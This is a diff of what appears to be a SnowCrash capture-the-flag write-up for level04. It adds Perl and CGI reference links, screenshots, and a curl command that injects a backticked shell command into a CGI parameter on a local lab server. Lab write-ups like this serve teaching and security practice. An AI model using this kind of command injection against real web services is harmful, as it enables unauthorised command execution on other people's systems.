@@ -2,6 +2,8 @@
 
 ![image](https://github.com/user-attachments/assets/afec7e89-9de1-4216-9479-25f7c7e55e12)
 
+![image](https://github.com/user-attachments/assets/085d513d-7dc6-4b2c-89ef-8574d0d3f4c1)
+
 ![image](https://github.com/user-attachments/assets/c888db70-7096-4545-a2ad-dbf77416d8d4)
 
 ```
@@ -15,6 +17,16 @@ sub x {
 }
 x(param("x"));
 ```
+https://www.tutorialspoint.com/perl/perl_subroutines.htm
 
-![image](https://github.com/user-attachments/assets/085d513d-7dc6-4b2c-89ef-8574d0d3f4c1)
+https://www.perl.com/article/perl-and-cgi/#why-not-to-use-cgi
+
+https://metacpan.org/dist/CGI/view/lib/CGI.pod#Fetching-the-value-or-values-of-a-single-named-parameter
+```
+level04@SnowCrash:~$ curl 'http://localhost:4747/level04.pl?x=`getflag`'
+```
+![image](https://github.com/user-attachments/assets/390db6a7-889b-4a9b-99f1-7a325288c15b)
+
+![image](https://github.com/user-attachments/assets/f252564f-cfb3-4278-976d-06e83465f6b9)
+
 
